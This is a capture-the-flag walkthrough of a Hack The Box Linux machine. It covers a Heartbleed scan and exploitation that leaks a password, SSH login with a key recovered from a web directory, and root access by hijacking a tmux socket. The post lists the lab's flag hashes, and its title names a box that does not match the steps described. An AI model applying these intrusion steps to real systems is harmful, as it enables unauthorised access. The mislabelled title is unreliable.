---
layout: post
title:  "HTB Bashed Linux"
description : 
tags: 
---

# Recon
Nmap scan
```ruby
Quick_10.10.10.79.nmap 10.10.10.79
Nmap scan report for 10.10.10.79
Host is up (0.026s latency).
Not shown: 997 closed ports
PORT STATE SERVICE
22/tcp open ssh
80/tcp open http
443/tcp open https
```
We find the site is vulnerable to Heartbleed attack
```ruby
| ssl-heartbleed:
| VULNERABLE:
| The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic
software library. It allows for stealing information intended to be protected by SSL/TLS
encryption.
| State: VULNERABLE
| Risk factor: High
| OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of
OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems
protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise
encrypted confidential information as well as the encryption keys themselves.
```
We run sslyze just to corroborate
```ruby
CHECKING HOST(S) AVAILABILITY
 -----------------------------
 10.10.10.79:443 => 10.10.10.79:443
 SCAN RESULTS FOR 10.10.10.79:443 - 10.10.10.79:443
 --------------------------------------------------
 * OpenSSL Heartbleed:
 VULNERABLE - Server is vulnerable to Heartbleed
```
Dirbuster locates a directory called /dev/ that contain a **hype_key** file
We make use of cyberchef and use the option magic and we get a RSA-AES-128 key
we save it as hype.key format and wi will use it later with SSH
# Exploitation Heartbleed
Since we know the webiste is vuln to heartbleed we quiclly google " heartbleed python
github"
We use the script with the target IP and the number of iterations we want the script to run "-n 30"
After reviewing the ouptput we quickly notice a base64 string that repeats a lot so we copied and decode to get a passwd.
```ruby
aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==
```
```ruby
heartbleedbelievethehype
```
At this point is pretty clear that our path to exploitation is through SSH as we have a ssh key file and a password to use
We proceed to ssh into as user hype
```chmod 600 hype.key
ssh -i hype.key hype@10.10.10.79
```
NOTE:for some reason doing a 755 on hype.key I would get a warning message that was stopping
from login.

# Privelege Escalation
We cat the bash_history file and we find the following:
```ruby
exit
exot
exit
ls -la
cd /
ls -la
cd .devs
ls -la
tmux -L dev_sess
tmux a -t dev_sess
tmux --help
tmux -S /.devs/dev_sess
```
There is a shell program called tmux owned by root
but with group permission set with "hype" to which we are part of it so we execute
```ruby
tmux -S /.devs/dev_sess
```
and we get ROOT!
```ruby
USER  "e6710a5464769fd5fcd216e076961750" 
ROOT  "f1bb6d759df1f272914ebbc9ed7765b2" 
```
